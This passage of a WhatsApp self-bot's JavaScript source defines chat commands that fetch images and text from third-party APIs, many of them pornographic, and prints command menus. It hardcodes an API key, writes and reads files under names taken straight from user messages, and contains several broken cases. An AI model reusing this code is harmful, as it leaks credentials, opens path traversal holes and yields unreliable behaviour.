͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${teks2}`
hexa.sendMessage(from, hasil, text, {
  quoted: mek
})
break
case 'pepek':
tpoi = fs.readFileSync('./lib/image/fino.jpeg')
					desco = `Visit Me`
					tite = `Lopia Owner Bot`
					urlo = `  https://linktr.ee/loplopia`
					 buiu = `owner bacot lu`
					var anu = {
					detectLinks: false
					}
					var mat = await hexa.generateLinkPreview(urlo)
					mat.title = tite;
					mat.description = desco;
					mat.jpegThumbnail = tpoi;
				   mat.canonicalUrl = buiu; 
					hexa.sendMessage(from, mat, MessageType.extendedText, anu, { quoted:ftroli })
break
case 'asamaulhusna2':
peler = fetchJson("https://myhuman.herokuapp.com/api/islam/asmaulhusna")
teks = `Nomor : ${data.nomor} \n *Latin* : ${data.latin} \n *Arabic": ${data.arabic} \n *Translate indonesia*: ${data.translation_id} \n *Translate inggris*: ${data.translation_en}`
hexa.sendMessage(from, text, {quoted:mek, caption:peler})
break

case 'source':
 case 'sc':
  case 'script':
   destagay = `Bot ini menggunakan sc \nHttp://Github.com/Hexagonz/SELF-BOT`
   hexa.sendMessage(from, destagay, text, {quoted:fvideo})
   break
   case 'bug92':
    var tes = `tes`
    fakegroup(tes)
   break
  case 'blackpink':
   getBuffer(`https://lolhuman.herokuapp.com/api/textprome/blackpink?apikey=${lolkey}&text=${body.slice(11)}`) 
   .then((gambar) => {
    hexa.sendMessage(from, gambar, image, {quoted:ftroli})
   })
    break
case 'cekapikey':
p = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${q}`)
teks = `Username: ${p.result.username} \nRequest: ${p.result.request} \nToday: ${p.result.today} \nAccountType: ${p.result.account_type} \nExpired: ${p.result.expired}`
hexa.sendMessage(from, teks, text, {quoted:ftroli})
break

case 'niatsholat':
 anu = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${body.slice(12)}?apikey=DestaPrasApi`)
 y = `Name: ${anu.result.name} \n Arab: ${anu.result.ar} \n Latin: ${anu.result.latin} \n Indonesia: ${anu.result.id}`
 hexa.sendMessage(from, y, text, {quoted:ftroli})
 break
                    // Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                    getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                    await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                    getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkey}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break

                    // Textprome //
                case 'blackpink':
                case 'neon':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break
                case 'tiktok':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        hexa.sendMessage(from, gambar, image, { quoted:ftroli })
                    })
                    break
        case 'cekapivhtear':
         y = await fetchJson(`https://api.vhtear.com/resultkey?apikey=${body.slice(12)}`)
         p = `Apikey Name: ${y.result.apikey} \nFrom: ${y.result.From} \n Expired: ${y.result.expired} \nStatus: ${y.result.status} \n DataLogApikey: ${y.result.dataapikey}`
         hexa.sendMessage(from, p, text, {quoted:ftroli})
         break
case '18+image':
 p = `  *[ 18+image ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}bj_
┣ ◩ _${prefix}ero_
┣ ◩ _${prefix}cum_
┣ ◩ _${prefix}feet_
┣ ◩ _${prefix}yuri_
┣ ◩ _${prefix}trap_
┣ ◩ _${prefix}lewd_
┣ ◩ _${prefix}feed_
┣ ◩ _${prefix}eron_
┣ ◩ _${prefix}solo_
┣ ◩ _${prefix}gasm_
┣ ◩ _${prefix}poke_
┣ ◩ _${prefix}anal_
┣ ◩ _${prefix}holo_
┣ ◩ _${prefix}tits_
┣ ◩ _${prefix}kuni_
┣ ◩ _${prefix}kiss_
┣ ◩ _${prefix}erok_
┣ ◩ _${prefix}smug_
┣ ◩ _${prefix}baka_
┣ ◩ _${prefix}solog_
┣ ◩ _${prefix}feetg_
┣ ◩ _${prefix}lewdk_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}pussy_
┣ ◩ _${prefix}femdom_
┣ ◩ _${prefix}cuddle_
┣ ◩ _${prefix}hentai_
┣ ◩ _${prefix}eroyuri_
┣ ◩ _${prefix}cum_jpg_
┣ ◩ _${prefix}blowjob_
┣ ◩ _${prefix}erofeet_
┣ ◩ _${prefix}holoero_
┣ ◩ _${prefix}classic_
┣ ◩ _${prefix}erokemo_
┣ ◩ _${prefix}fox_girl_
┣ ◩ _${prefix}futanari_
┣ ◩ _${prefix}lewdkemo_
┣ ◩ _${prefix}wallpaper_
┣ ◩ _${prefix}pussy_jpg_
┣ ◩ _${prefix}kemonomimi_
┣ ◩ _${prefix}nsfw_avatar_
┗━━━━━━━━ ❑`
                hexa.sendMessage(from, p, text, {quoted:ftroli})
                break
case '18+image2':
 p =`   *[ 18+image2 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}bj_
┣ ◩ _${prefix}ero_
┣ ◩ _${prefix}cum_
┣ ◩ _${prefix}feet_
┣ ◩ _${prefix}yuri_
┣ ◩ _${prefix}trap_
┣ ◩ _${prefix}lewd_
┣ ◩ _${prefix}feed_
┣ ◩ _${prefix}eron_
┣ ◩ _${prefix}solo_
┣ ◩ _${prefix}gasm_
┣ ◩ _${prefix}poke_
┣ ◩ _${prefix}anal_
┣ ◩ _${prefix}holo_
┣ ◩ _${prefix}tits_
┣ ◩ _${prefix}kuni_
┣ ◩ _${prefix}kiss_
┣ ◩ _${prefix}erok_
┣ ◩ _${prefix}smug_
┣ ◩ _${prefix}baka_
┣ ◩ _${prefix}solog_
┣ ◩ _${prefix}feetg_
┣ ◩ _${prefix}lewdk_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}pussy_
┣ ◩ _${prefix}femdom_
┣ ◩ _${prefix}cuddle_
┣ ◩ _${prefix}hentai_
┣ ◩ _${prefix}eroyuri_
┣ ◩ _${prefix}cum_jpg_
┣ ◩ _${prefix}blowjob_
┣ ◩ _${prefix}erofeet_
┣ ◩ _${prefix}holoero_
┣ ◩ _${prefix}classic_
┣ ◩ _${prefix}erokemo_
┣ ◩ _${prefix}fox_girl_
┣ ◩ _${prefix}futanari_
┣ ◩ _${prefix}lewdkemo_
┣ ◩ _${prefix}wallpaper_
┣ ◩ _${prefix}pussy_jpg_
┣ ◩ _${prefix}kemonomimi_
┣ ◩ _${prefix}nsfw_avatar_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break

case 'textpro':
 p = `  *[ Text pro Menu ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}blackpink_
┣ ◩ _${prefix}neon_
┣ ◩ _${prefix}greenneon_
┣ ◩ _${prefix}advanceglow_
┣ ◩ _${prefix}futureneon_
┣ ◩ _${prefix}sandwriting_
┣ ◩ _${prefix}sandsummer_
┣ ◩ _${prefix}sandengraved_
┣ ◩ _${prefix}metaldark_
┣ ◩ _${prefix}neonlight_
┣ ◩ _${prefix}holographic_
┣ ◩ _${prefix}text1917_
┣ ◩ _${prefix}minion_
┣ ◩ _${prefix}deluxesilver_
┣ ◩ _${prefix}newyearcard_
┣ ◩ _${prefix}bloodfrosted_
┣ ◩ _${prefix}halloween_
┣ ◩ _${prefix}jokerlogo_
┣ ◩ _${prefix}fireworksparkle_
┣ ◩ _${prefix}natureleaves_
┣ ◩ _${prefix}bokeh_
┣ ◩ _${prefix}toxic_
┣ ◩ _${prefix}strawberry_
┣ ◩ _${prefix}box3d_
┣ ◩ _${prefix}roadwarning_
┣ ◩ _${prefix}breakwall_
┣ ◩ _${prefix}icecold_
┣ ◩ _${prefix}luxury_
┣ ◩ _${prefix}cloud_
┣ ◩ _${prefix}summersand_
┣ ◩ _${prefix}horrorblood_
┣ ◩ _${prefix}thunder_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break

case 'cari':
 anu = await fetchJson(`https://myhuman.herokuapp.com/api/search/stickerpack?search=${body.slice(6)}`)
 y = `Title: ${anu.title} \nUsername: ${anu.username} \nThumb: ${anu.thumb} \nLimk: ${anu.link}`
 hexa.sendMessage(from, y, text, {quoted:fvideo})
 break
 case 'stickerwa2':
   y = await fetchJson(`https://myhuman.herokuapp.com/api/search/stickers?search=${body.slice(10)}`)
   buffer = y.result.sticker
   for ( var x of y) {
    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`)
    await hexa.sendMessage(from, buffer, sticker)
   }
   break
   case 'doaharian':
    get = await fetchJson(`https://myhuman.herokuapp.com/api/islam/alquran?search=${body.slice(11)}`)
    teks = `Nama doa: ${get.title} \nArab: ${get.arabic} \nArti: ${get.arti}`
    hexa.sendMessage(from, teks, text, {quoted:ftroli})
    break
    case 'jalantikus':
     yes = await fetchJson(`https://api.lolhuman.xyz/api/jalantikus?apikey=DestaPrasApi`)
     p = `Nama: ${yes.result.title} \nLink: ${yes.result.link} \nCategory: ${yes.result.category} \nTime: ${yes.result.time}`
     hexa.sendMessage(from, text, {quoted:mek,caption:p})
 break
 case 'ephoto360':
  p = `   *[ EPHOTO 360 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}blackpink_
┣ ◩ _${prefix}neon_
┣ ◩ _${prefix}greenneon_
┣ ◩ _${prefix}advanceglow_
┣ ◩ _${prefix}futureneon_
┣ ◩ _${prefix}sandwriting_
┣ ◩ _${prefix}sandsummer_
┣ ◩ _${prefix}sandengraved_
┣ ◩ _${prefix}metaldark_
┣ ◩ _${prefix}neonlight_
┣ ◩ _${prefix}holographic_
┣ ◩ _${prefix}text1917_
┣ ◩ _${prefix}minion_
┣ ◩ _${prefix}deluxesilver_
┣ ◩ _${prefix}newyearcard_
┣ ◩ _${prefix}bloodfrosted_
┣ ◩ _${prefix}halloween_
┣ ◩ _${prefix}jokerlogo_
┣ ◩ _${prefix}fireworksparkle_
┣ ◩ _${prefix}natureleaves_
┣ ◩ _${prefix}bokeh_
┣ ◩ _${prefix}toxic_
┣ ◩ _${prefix}strawberry_
┣ ◩ _${prefix}box3d_
┣ ◩ _${prefix}roadwarning_
┣ ◩ _${prefix}breakwall_
┣ ◩ _${prefix}icecold_
┣ ◩ _${prefix}luxury_
┣ ◩ _${prefix}cloud_
┣ ◩ _${prefix}summersand_
┣ ◩ _${prefix}horrorblood_
┣ ◩ _${prefix}thunder_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break
case 'logomaker':
 p = `    *[ LOGO MAKER ]
┏━━━━━━━ ❒
┣ ◩ _${prefix}pornhub_
┣ ◩ _${prefix}glitch_
┣ ◩ _${prefix}avenger_
┣ ◩ _${prefix}space_
┣ ◩ _${prefix}ninjalogo_
┣ ◩ _${prefix}marvelstudio_
┣ ◩ _${prefix}lionlogo_
┣ ◩ _${prefix}wolflogo_
┣ ◩ _${prefix}steel3d_
┣ ◩ _${prefix}wallgravity_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break

case 'textpro2':
 p = `    [ TEXT PRO 2 ]
┏━━━━━━━ ❒
┣ ◩ _${prefix}blackpink_
┣ ◩ _${prefix}neon_
┣ ◩ _${prefix}greenneon_
┣ ◩ _${prefix}advanceglow_
┣ ◩ _${prefix}futureneon_
┣ ◩ _${prefix}sandwriting_
┣ ◩ _${prefix}sandsummer_
┣ ◩ _${prefix}sandengraved_
┣ ◩ _${prefix}metaldark_
┣ ◩ _${prefix}neonlight_
┣ ◩ _${prefix}holographic_
┣ ◩ _${prefix}text1917_
┣ ◩ _${prefix}minion_
┣ ◩ _${prefix}deluxesilver_
┣ ◩ _${prefix}newyearcard_
┣ ◩ _${prefix}bloodfrosted_
┣ ◩ _${prefix}halloween_
┣ ◩ _${prefix}jokerlogo_
┣ ◩ _${prefix}fireworksparkle_
┣ ◩ _${prefix}natureleaves_
┣ ◩ _${prefix}bokeh_
┣ ◩ _${prefix}toxic_
┣ ◩ _${prefix}strawberry_
┣ ◩ _${prefix}box3d_
┣ ◩ _${prefix}roadwarning_
┣ ◩ _${prefix}breakwall_
┣ ◩ _${prefix}icecold_
┣ ◩ _${prefix}luxury_
┣ ◩ _${prefix}cloud_
┣ ◩ _${prefix}summersand_
┣ ◩ _${prefix}horrorblood_
┣ ◩ _${prefix}thunder_
┗━━━━━━━━ ❑`
hexa.sendMessage(from, p, text, {quoted:fvideo})
break
case 'hemlo':
 case 'fino':
const buttons = [
  {buttonId: `${prefix}kontolodon`, buttonText: {displayText: ' Ganteng '}, type: 1},
  {buttonId: `${prefix}kontolodon2`, buttonText: {displayText: 'Bacot'}, type: 1},
  {buttonId: `${prefix}kontolodon2`, buttonText: {displayText: 'Kontol'}, type: 1}
]

const buttonMessage = {
    contentText: "Fino ganteng ga?",
    footerText: 'pilih satu jing',
    buttons: buttons,
    headerType: 1
}

const sendMessage = await hexa.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
break
case 'kontolodon':
 ler = `Makasih Sayang( buat cwe )`
 hexa.sendMessage(from, ler, text, {quoted:mek})
 break
 case 'kontolodon2':
  ler2 =`makasih anjg`
  hexa.sendMessage(from, ler2, text, {quoted:mek})
 break
case 'addvn':
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await hexa.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./lib/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./lib/vn.json', JSON.stringify(audionye))
				hexa.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
				break

			case 'getvn':
				namastc = body.slice(7)
				try {
				buffer = fs.readFileSync(`./lib/audio/${namastc}.mp3`)
				hexa.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: false })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break

			case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
